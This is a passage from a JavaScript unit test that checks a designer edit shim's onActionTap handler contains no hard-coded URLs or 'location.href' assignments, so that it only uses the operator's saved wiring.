    // operator's own saved wiring. Nothing here may invent an href.
    const body = DESIGNER_EDIT_SHIM.slice(DESIGNER_EDIT_SHIM.indexOf('function onActionTap'));
    const emit = body.slice(0, body.indexOf('document.addEventListener'));
    expect(emit).not.toMatch(/https?:\/\//);
    expect(emit).not.toContain('location.href');
  });
});
